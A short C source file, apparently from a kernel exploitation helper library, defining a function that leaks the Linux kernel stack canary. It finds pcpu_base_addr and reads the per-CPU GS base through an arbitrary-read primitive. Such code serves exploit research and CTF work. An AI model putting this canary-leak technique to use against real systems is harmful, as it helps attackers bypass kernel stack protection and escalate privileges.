#include <uallsyms/uallsyms.h>

#include "utils/log.h"

u64 resolve_canary(uas_t *uas)
{
    kaddr_t pcpu_base_addr;
    kaddr_t kernel_gs;
    u64 canary;
    int ret;

    pcpu_base_addr = uas_lookup_name(uas, "pcpu_base_addr");
    if (pcpu_base_addr == UNKNOWN_KADDR) {
        pr_err("[resolve_canary] pcpu_base_addr == UNKNOWN_KADDR\n");
        return 0;
    }

    pr_debug("[resolve_canary] pcpu_base_addr: %#lx\n", pcpu_base_addr);

    ret = uas_aar(uas, &kernel_gs, pcpu_base_addr, sizeof(kernel_gs));
    if (ret < 0) {
        pr_err("[resolve_canary] ret < 0\n");
        return 0;
    }

    pr_debug("[resolve_canary] kernel_gs: %#lx\n", kernel_gs);

    ret = uas_aar(uas, &canary, kernel_gs + 0x28, sizeof(canary));
    if (ret < 0) {
        pr_err("[resolve_canary] ret < 0\n");
        return 0;
    }

    pr_debug("[resolve_canary] canary: %#lx\n", canary);

    return canary;
}